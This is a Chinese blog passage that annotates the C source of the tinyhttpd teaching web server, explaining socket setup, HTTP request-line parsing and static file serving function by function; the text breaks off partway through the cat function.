<h4 id="2-4-startup函数"><a href="#2-4-startup函数" class="headerlink" title="2.4 startup函数"></a>2.4 startup函数</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">/* This function starts the process of listening for web connections</span></span><br><span class="line"><span class="comment"> * on a specified port.  If the port is 0, then dynamically allocate a</span></span><br><span class="line"><span class="comment"> * port and modify the original port variable to reflect the actual</span></span><br><span class="line"><span class="comment"> * port.</span></span><br><span class="line"><span class="comment"> * Parameters: pointer to variable containing the port to connect on</span></span><br><span class="line"><span class="comment"> * Returns: the socket */</span></span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">startup</span><span class="params">(u_short *port)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> httpd = <span class="number">0</span>; <span class="comment">//初始化 httpd socket</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">name</span>;</span> <span class="comment">//httpd地址结构体变量，存储地址信息</span></span><br><span class="line"> <span class="comment">//设置http socket</span></span><br><span class="line"> httpd = socket(PF_INET, SOCK_STREAM, <span class="number">0</span>); <span class="comment">//创建一个基于IPv4协议的，面向连接的TCP套接字</span></span><br><span class="line"> <span class="keyword">if</span> (httpd == <span class="number">-1</span>) <span class="comment">//如果创建socket失败，httpd值为-1</span></span><br><span class="line">  error_die(<span class="string">&quot;socket&quot;</span>); <span class="comment">//调用error_die函数处理错误并退出</span></span><br><span class="line"> <span class="built_in">memset</span>(&amp;name, <span class="number">0</span>, <span class="keyword">sizeof</span>(name)); <span class="comment">//用0填充name，即将name清零</span></span><br><span class="line"> name.sin_family = AF_INET; <span class="comment">//设置 sin_family 成员为 AF_INET 表示该地址族是IPv4</span></span><br><span class="line"> name.sin_port = htons(*port); <span class="comment">//设置端口号，htons()函数用来把16位数从主机字节序转换到网络字节序</span></span><br><span class="line"> name.sin_addr.s_addr = htonl(INADDR_ANY); <span class="comment">//设置IP地址为 INADDR_ANY,这是一个宏定义，表示任意IP地址，值为0。htonl()函数同htons，处理32位的数据。</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">//绑定端口</span></span><br><span class="line"> <span class="keyword">if</span> (bind(httpd, (<span class="keyword">struct</span> sockaddr *)&amp;name, <span class="keyword">sizeof</span>(name)) &lt; <span class="number">0</span>) <span class="comment">//将套接字与指定的IP地址和端口号绑定起来</span></span><br><span class="line">  error_die(<span class="string">&quot;bind&quot;</span>); <span class="comment">//自定义错误处理函数，如果出错，则调用error_die函数处理并退出。</span></span><br><span class="line">    </span><br><span class="line"> <span class="keyword">if</span> (*port == <span class="number">0</span>)  <span class="comment">/*动态分配一个端口 */</span></span><br><span class="line"> &#123;</span><br><span class="line">  <span class="type">socklen_t</span> namelen = <span class="keyword">sizeof</span>(name);</span><br><span class="line">  <span class="keyword">if</span> (getsockname(httpd, (<span class="keyword">struct</span> sockaddr *)&amp;name, &amp;namelen) == <span class="number">-1</span>) <span class="comment">//获取已经绑定的端口号，保存在传入的name结构体变量中</span></span><br><span class="line">   error_die(<span class="string">&quot;getsockname&quot;</span>); <span class="comment">//自定义错误函数，如果出错，则调用error_die函数处理并退出。</span></span><br><span class="line">  *port = ntohs(name.sin_port); <span class="comment">//把网络字节序转为主机字节序，保存端口号</span></span><br><span class="line"> &#125;</span><br><span class="line">    </span><br><span class="line"> <span class="comment">//监听连接</span></span><br><span class="line"> <span class="keyword">if</span> (listen(httpd, <span class="number">5</span>) &lt; <span class="number">0</span>) <span class="comment">//开始监听连接请求，最多可以接受5个连接。</span></span><br><span class="line">  error_die(<span class="string">&quot;listen&quot;</span>); <span class="comment">//自定义错误函数，如果出错，则调用error_die函数处理并退出。</span></span><br><span class="line"> <span class="keyword">return</span>(httpd); <span class="comment">//返回已经绑定好IP和端口号的套接字描述符</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="error-die函数"><a href="#error-die函数" class="headerlink" title="error_die函数"></a>error_die函数</h5><p>可以看到main和start_up函数中出现了多次error_die函数，就放在这里说一下，根据注释其实也能猜个七七八八了：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">/* Print out an error message with perror() (for system errors; based</span></span><br><span class="line"><span class="comment"> * on value of errno, which indicates system call errors) and exit the</span></span><br><span class="line"><span class="comment"> * program indicating an error. */</span></span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">error_die</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *sc)</span></span><br><span class="line">&#123;</span><br><span class="line"> perror(sc);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了不影响阅读的连贯性，把关于perror函数的介绍放在最后的了，留个<a href="#perror">传送门</a>。</p>
<h4 id="2-5-accept-request函数⭐"><a href="#2-5-accept-request函数⭐" class="headerlink" title="2.5 accept_request函数⭐"></a>2.5 accept_request函数⭐</h4><p>这个函数是整个代码的核心，负责处理客户端发来的请求。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">/* A request has caused a call to accept() on the server port to</span></span><br><span class="line"><span class="comment"> * return.  Process the request appropriately.</span></span><br><span class="line"><span class="comment"> * Parameters: the socket connected to the client */</span></span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">accept_request</span><span class="params">(<span class="type">void</span>* from_client)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> client = *(<span class="type">int</span> *)from_client; <span class="comment">//从参数中获取客户端套接字</span></span><br><span class="line"> <span class="comment">//定义缓冲区及其他的一些变量</span></span><br><span class="line"> <span class="type">char</span> buf[<span class="number">1024</span>]; </span><br><span class="line"> <span class="type">int</span> numchars;</span><br><span class="line"> <span class="type">char</span> method[<span class="number">255</span>];</span><br><span class="line"> <span class="type">char</span> url[<span class="number">255</span>];</span><br><span class="line"> <span class="type">char</span> path[<span class="number">512</span>];</span><br><span class="line"> <span class="type">size_t</span> i, j;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"> <span class="type">int</span> cgi = <span class="number">0</span>;      <span class="comment">/* becomes true if server decides this is a CGI</span></span><br><span class="line"><span class="comment">                    * program */</span></span><br><span class="line"> <span class="type">char</span> *query_string = <span class="literal">NULL</span>; <span class="comment">//定义查询字符串变量</span></span><br><span class="line"> <span class="comment">/* get_line函数解析一行http报文，并返回字节数  */</span></span><br><span class="line"> numchars = get_line(client, buf, <span class="keyword">sizeof</span>(buf)); <span class="comment">//这里获取第一行http报文的内容</span></span><br><span class="line"> <span class="comment">//</span></span><br><span class="line"> i = <span class="number">0</span>; j = <span class="number">0</span>; <span class="comment">//j是作为该行报文的索引</span></span><br><span class="line"> <span class="comment">//对于HTTP报文来说，第一行的内容为报文的起始行，格式如下：&lt;method&gt; &lt;request-URL&gt; &lt;version&gt;</span></span><br><span class="line"> <span class="comment">//每个字符用空白字段相连</span></span><br><span class="line"> <span class="comment">//从第一行第一个字符开始判断，当不是空白字符，并且不超method数组长度时，</span></span><br><span class="line"> <span class="keyword">while</span> (!ISspace(buf[j]) &amp;&amp; (i &lt; <span class="keyword">sizeof</span>(method) - <span class="number">1</span>))</span><br><span class="line"> &#123;<span class="comment">//提取报文起始行的method字段</span></span><br><span class="line">  method[i] = buf[j]; <span class="comment">//将字符保存到method数组中，即从起始行中提取请求方式，保存在method</span></span><br><span class="line">  i++; j++;</span><br><span class="line"> &#125;</span><br><span class="line"> method[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="comment">//函数说明：strcasecmp()用来比较参数s1 和s2 字符串，比较时会自动忽略大小写的差异。</span></span><br><span class="line"><span class="comment">//返回值：若参数s1 和s2 字符串相同则返回0。s1 长度大于s2 长度则返回大于0 的值，s1 长度若小于s2 长度则返回小于0 的值。</span></span><br><span class="line"> <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;GET&quot;</span>) &amp;&amp; strcasecmp(method, <span class="string">&quot;POST&quot;</span>))</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="comment">// tinyhttpd仅支持 GET 和 POST 这两种请求方式</span></span><br><span class="line">  unimplemented(client); <span class="comment">//如果是这GET和POST之外的请求方式，则调用unimplemented函数。</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//如果请求方法为POST，需要cgi解析</span></span><br><span class="line"> <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;POST&quot;</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="comment">//设置cgi标志位，置1说明开启cgi解析</span></span><br><span class="line">  cgi = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"> i = <span class="number">0</span>;</span><br><span class="line"> <span class="comment">//将method后边的空白字符略过</span></span><br><span class="line"> <span class="keyword">while</span> (ISspace(buf[j]) &amp;&amp; (j &lt; <span class="keyword">sizeof</span>(buf)))</span><br><span class="line">  j++;</span><br><span class="line"> <span class="comment">//开始提取初始行中的request-URL字段</span></span><br><span class="line"> <span class="keyword">while</span> (!ISspace(buf[j]) &amp;&amp; (i &lt; <span class="keyword">sizeof</span>(url) - <span class="number">1</span>) &amp;&amp; (j &lt; <span class="keyword">sizeof</span>(buf)))</span><br><span class="line"> &#123;</span><br><span class="line">  url[i] = buf[j];</span><br><span class="line">  i++; j++;</span><br><span class="line"> &#125;</span><br><span class="line"> url[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="comment">//判断，如果是GET请求，URL中可能会有？，即有查询参数</span></span><br><span class="line"> <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;GET&quot;</span>) == <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line">  query_string = url; <span class="comment">//将query_string指向提取出来的url</span></span><br><span class="line">  <span class="comment">//对url中的字符进行逐个判断，是否为？或者&#x27;\0&#x27;</span></span><br><span class="line">  <span class="keyword">while</span> ((*query_string != <span class="string">&#x27;?&#x27;</span>) &amp;&amp; (*query_string != <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">   query_string++;</span><br><span class="line">  <span class="comment">//如果是？，即有查询参数，需要执行cgi解析参数，同样设置标志位</span></span><br><span class="line">  <span class="keyword">if</span> (*query_string == <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   cgi = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">//将？字符改为&#x27;\0&#x27;，即将后边的查询参数给截取出来</span></span><br><span class="line">   *query_string = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">   query_string++; <span class="comment">//现在query_string指向查询参数的第一个字符处</span></span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">/*以上已经将报文的起始行解析完毕。*/</span></span><br><span class="line"> <span class="comment">//此时url所指的字符串已经不包含后边的查询参数</span></span><br><span class="line"> <span class="built_in">sprintf</span>(path, <span class="string">&quot;htdocs%s&quot;</span>, url); <span class="comment">//将url中的路径格式化到path，根目录为htdocs</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (path[<span class="built_in">strlen</span>(path) - <span class="number">1</span>] == <span class="string">&#x27;/&#x27;</span>) <span class="comment">//如果path只是一个目录(以/结尾)，默认设置为当前请求下的index.html</span></span><br><span class="line">  <span class="built_in">strcat</span>(path, <span class="string">&quot;index.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//函数定义:    int stat(const char *file_name, struct stat *buf); </span></span><br><span class="line"> <span class="comment">//函数说明:    通过文件名filename获取文件信息，并保存在buf所指的结构体stat中，可以通过该指针访问文件的各种属性</span></span><br><span class="line"> <span class="comment">//返回值:     执行成功则返回0，失败返回-1，错误代码存于errno（需要include &lt;errno.h&gt;）</span></span><br><span class="line"> <span class="keyword">if</span> (stat(path, &amp;st) == <span class="number">-1</span>) &#123; <span class="comment">//如果查询文件失败,即访问的网页不存在</span></span><br><span class="line">  <span class="comment">//则不断读取剩下的请求头信息，并丢弃 </span></span><br><span class="line">  <span class="keyword">while</span> ((numchars &gt; <span class="number">0</span>) &amp;&amp; <span class="built_in">strcmp</span>(<span class="string">&quot;\n&quot;</span>, buf))  <span class="comment">/* read &amp; discard headers */</span></span><br><span class="line">   numchars = get_line(client, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="comment">// 调用not_found函数，声明页面不存在。</span></span><br><span class="line">  not_found(client);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="comment">//如果访问的文件存在</span></span><br><span class="line"> &#123;</span><br><span class="line">  <span class="comment">//判断该路径是否是一个目录，S_IFDIR代表目录</span></span><br><span class="line">  <span class="keyword">if</span> ((st.st_mode &amp; S_IFMT) == S_IFDIR)</span><br><span class="line">   <span class="built_in">strcat</span>(path, <span class="string">&quot;/index.html&quot;</span>); <span class="comment">//如果path是目录，那就将主页进行显示</span></span><br><span class="line">  <span class="comment">//判断文件是否可执行，如果可执行，则认为cgi文件，设置标志位  </span></span><br><span class="line">  <span class="keyword">if</span> ((st.st_mode &amp; S_IXUSR) ||</span><br><span class="line">      (st.st_mode &amp; S_IXGRP) ||</span><br><span class="line">      (st.st_mode &amp; S_IXOTH)    )</span><br><span class="line">      <span class="comment">//S_IXUSR:文件所有者具可执行权限</span></span><br><span class="line">      <span class="comment">//S_IXGRP:用户组具可执行权限</span></span><br><span class="line">      <span class="comment">//S_IXOTH:其他用户具可执行权限  </span></span><br><span class="line">   cgi = <span class="number">1</span>; <span class="comment">//设置cgi标志位</span></span><br><span class="line">     </span><br><span class="line">  <span class="keyword">if</span> (!cgi) <span class="comment">//根据cgi标志位的值来选择不同的处理方式</span></span><br><span class="line">   serve_file(client, path); <span class="comment">//处理不带查询参数的GET请求，且请求的是不可执行文件，即静态文件。</span></span><br><span class="line">  <span class="keyword">else</span> <span class="comment">//执行cgi动态解析</span></span><br><span class="line">   execute_cgi(client, path, method, query_string);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> close(client); <span class="comment">//因为http是面向无连接的，所以要关闭</span></span><br><span class="line"> <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面依次来贴一下其中遇到的一些函数：</p>
<h5 id="get-line函数"><a href="#get-line函数" class="headerlink" title="get_line函数"></a>get_line函数</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">/* Get a line from a socket, whether the line ends in a newline,</span></span><br><span class="line"><span class="comment"> * carriage return, or a CRLF combination.  Terminates the string read</span></span><br><span class="line"><span class="comment"> * with a null character.  If no newline indicator is found before the</span></span><br><span class="line"><span class="comment"> * end of the buffer, the string is terminated with a null.  If any of</span></span><br><span class="line"><span class="comment"> * the above three line terminators is read, the last character of the</span></span><br><span class="line"><span class="comment"> * string will be a linefeed and the string will be terminated with a</span></span><br><span class="line"><span class="comment"> * null character.</span></span><br><span class="line"><span class="comment"> * Parameters: the socket descriptor</span></span><br><span class="line"><span class="comment"> *             the buffer to save the data in</span></span><br><span class="line"><span class="comment"> *             the size of the buffer</span></span><br><span class="line"><span class="comment"> * Returns: the number of bytes stored (excluding null) */</span></span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_line</span><span class="params">(<span class="type">int</span> sock, <span class="type">char</span> *buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> i = <span class="number">0</span>; <span class="comment">//缓冲区索引</span></span><br><span class="line"> <span class="type">char</span> c = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">//当前正在读取的字符（用于接收字符的缓冲区，大小为1字节）</span></span><br><span class="line"> <span class="type">int</span> n; <span class="comment">//从套接字接受到的字节数</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">//当读取到缓冲区末尾或者遇到换行符</span></span><br><span class="line"> <span class="keyword">while</span> ((i &lt; size - <span class="number">1</span>) &amp;&amp; (c != <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line"> &#123;</span><br><span class="line">  n = recv(sock, &amp;c, <span class="number">1</span>, <span class="number">0</span>); <span class="comment">//从客户端socket中读取1字节的字符并保存在变量c中，返回读取到的字节数给n。</span></span><br><span class="line">  <span class="comment">/* DEBUG printf(&quot;%02X\n&quot;, c); */</span></span><br><span class="line">  <span class="keyword">if</span> (n &gt; <span class="number">0</span>) <span class="comment">//表示成功接收到数据</span></span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">if</span> (c == <span class="string">&#x27;\r&#x27;</span>) <span class="comment">//如果当前字符是回车符（\r）</span></span><br><span class="line">   &#123;</span><br><span class="line">    n = recv(sock, &amp;c, <span class="number">1</span>, MSG_PEEK); <span class="comment">//预读取流中的下一个字符，但不从输入队列中删除它</span></span><br><span class="line">    <span class="comment">//MSG_PEEK：接收数据但不会从输入队列中删除数据。</span></span><br><span class="line">    <span class="comment">/* DEBUG printf(&quot;%02X\n&quot;, c); */</span></span><br><span class="line">    <span class="keyword">if</span> ((n &gt; <span class="number">0</span>) &amp;&amp; (c == <span class="string">&#x27;\n&#x27;</span>)) <span class="comment">//如果这个预读取的字符是换行符(&#x27;\n&#x27;)</span></span><br><span class="line">     recv(sock, &amp;c, <span class="number">1</span>, <span class="number">0</span>); <span class="comment">//从输入队列中删除它</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     c = <span class="string">&#x27;\n&#x27;</span>; <span class="comment">//否则将它视为换行符</span></span><br><span class="line">   &#125;</span><br><span class="line">   buf[i] = c; <span class="comment">//将当前读取到的字符存储到buf缓冲区中，并增加索引值</span></span><br><span class="line">   i++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="comment">//如果没有接收到数据，则将当前字符视为换行符以终止字符串</span></span><br><span class="line">   c = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> buf[i] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">//使用空字符终止缓冲区</span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">return</span>(i); <span class="comment">//返回存储的字节数（不包括空字符）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="unimplemented函数"><a href="#unimplemented函数" class="headerlink" title="unimplemented函数"></a>unimplemented函数</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">/* Inform the client that the requested web method has not been</span></span><br><span class="line"><span class="comment"> * implemented.</span></span><br><span class="line"><span class="comment"> * Parameter: the client socket */</span></span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unimplemented</span><span class="params">(<span class="type">int</span> client)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"><span class="comment">//发送501说明相应方法没有实现</span></span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;HTTP/1.0 501 Method Not Implemented\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, SERVER_STRING);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;Content-Type: text/html\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Method Not Implemented\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;&lt;/TITLE&gt;&lt;/HEAD&gt;\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;&lt;BODY&gt;&lt;P&gt;HTTP request method not supported.\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;&lt;/BODY&gt;&lt;/HTML&gt;\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="not-found函数"><a href="#not-found函数" class="headerlink" title="not_found函数"></a>not_found函数</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">/* Give a client a 404 not found status message. */</span></span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">not_found</span><span class="params">(<span class="type">int</span> client)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"> <span class="comment">//返回404</span></span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;HTTP/1.0 404 NOT FOUND\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, SERVER_STRING);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;Content-Type: text/html\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;&lt;HTML&gt;&lt;TITLE&gt;Not Found&lt;/TITLE&gt;\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;&lt;BODY&gt;&lt;P&gt;The server could not fulfill\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;your request because the resource specified\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;is unavailable or nonexistent.\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;&lt;/BODY&gt;&lt;/HTML&gt;\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-6-serve-file函数"><a href="#2-6-serve-file函数" class="headerlink" title="2.6 serve_file函数"></a>2.6 serve_file函数</h4><p>serve_file 函数用于处理请求的静态文件，即不带参数的GET请求，并且请求的文件不可执行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">/* Send a regular file to the client.  Use headers, and report</span></span><br><span class="line"><span class="comment"> * errors to client if they occur.</span></span><br><span class="line"><span class="comment"> * Parameters: a pointer to a file structure produced from the socket</span></span><br><span class="line"><span class="comment"> *              file descriptor</span></span><br><span class="line"><span class="comment"> *             the name of the file to serve */</span></span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">//将请求的文件发送回浏览器客户端</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">serve_file</span><span class="params">(<span class="type">int</span> client, <span class="type">const</span> <span class="type">char</span> *filename)</span></span><br><span class="line">&#123;</span><br><span class="line"> FILE *resource = <span class="literal">NULL</span>;</span><br><span class="line"> <span class="type">int</span> numchars = <span class="number">1</span>;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"> </span><br><span class="line"> buf[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>; buf[<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">//初始化缓冲区中的第一个元素</span></span><br><span class="line"> <span class="keyword">while</span> ((numchars &gt; <span class="number">0</span>) &amp;&amp; <span class="built_in">strcmp</span>(<span class="string">&quot;\n&quot;</span>, buf)) <span class="comment">//不清楚这里的读取有什么意义</span></span><br><span class="line">  numchars = get_line(client, buf, <span class="keyword">sizeof</span>(buf)); <span class="comment">//调用get_line函数，直到读到空行为止。</span></span><br><span class="line"> <span class="comment">//打开指定的文件，以只读的方式打开</span></span><br><span class="line"> resource = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span> (resource == <span class="literal">NULL</span>)</span><br><span class="line"> <span class="comment">//如果文件不存在，则返回not_found</span></span><br><span class="line">  not_found(client);</span><br><span class="line"> <span class="keyword">else</span> <span class="comment">//如果文件存在</span></span><br><span class="line"> &#123; <span class="comment">//调用headers函数，把http响应头部写进套接字中</span></span><br><span class="line">  headers(client, filename);</span><br><span class="line">  <span class="comment">//调用cat函数，读取文件，并将其写入套接字中</span></span><br><span class="line">  cat(client, resource);</span><br><span class="line"> &#125;</span><br><span class="line"> fclose(resource);<span class="comment">//关闭文件句柄</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="headers函数"><a href="#headers函数" class="headerlink" title="headers函数"></a>headers函数</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">/* Return the informational HTTP headers about a file. */</span></span><br><span class="line"><span class="comment">/* Parameters: the socket to print the headers on</span></span><br><span class="line"><span class="comment"> *             the name of the file */</span></span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">headers</span><span class="params">(<span class="type">int</span> client, <span class="type">const</span> <span class="type">char</span> *filename)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"> (<span class="type">void</span>)filename;  <span class="comment">/* could use filename to determine file type */</span></span><br><span class="line"><span class="comment">//发送HTTP头</span></span><br><span class="line"> <span class="built_in">strcpy</span>(buf, <span class="string">&quot;HTTP/1.0 200 OK\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">strcpy</span>(buf, SERVER_STRING);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;Content-Type: text/html\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">strcpy</span>(buf, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="cat函数"><a href="#cat函数" class="headerlink" title="cat函数"></a>cat函数</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">/* Put the entire contents of a file out on a socket.  This function</span></span><br><span class="line"><span class="comment"> * is named after the UNIX &quot;cat&quot; command, because it might have been</span></span><br><span class="line"><span class="comment"> * easier just to do something like pipe, fork, and exec(&quot;cat&quot;).</span></span><br><span class="line"><span class="comment"> * Parameters: the client socket descriptor</span></span><br><span class="line"><span class="comment"> *             FILE pointer for the file to cat */</span></span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cat</span><span class="params">(<span class="type">int</span> client, FILE *resource)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"><span class="comment">//读取文件到buf中</span></span><br><span class="line"> fgets(buf, <span class="keyword">sizeof</span>(buf), resource);</span><br><span class="line"> <span class="keyword">while</span> (!feof(resource))<span class="comment">//判断文件是否读取到末尾</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="comment">//读取并发送文件内容</span></span><br><span class="line">  send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line">  fgets(buf, <span class="keyword">sizeof</span>(buf), resource);</span><br><span class="line"> &#125;</span><br><span 